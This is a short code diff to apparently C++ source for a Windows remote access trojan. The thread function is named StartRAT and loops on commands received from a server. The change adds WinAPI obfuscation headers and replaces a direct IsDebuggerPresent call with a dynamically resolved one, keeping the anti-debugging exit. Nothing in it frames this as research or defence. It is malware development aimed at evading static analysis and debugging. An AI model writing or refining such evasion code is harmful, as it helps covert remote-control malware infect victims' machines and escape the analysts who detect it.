@@ -2,7 +2,8 @@
 #include <string>
 #include "TCPClient.h"
 #include "utils.h"
-
+#include "winapi_function_signatures.h"
+#include "winapi_obfuscation.h"
 
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
@@ -11,7 +12,7 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 
 	while (true)
 	{
-		if (IsDebuggerPresent() || isDebuggerAttached())
+		if (resolve_dynamically<IsDebuggerPresent_t>("IsDebuggerPresent")() || isDebuggerAttached())
 			ExitThread(0);
 
 		// recv command from server
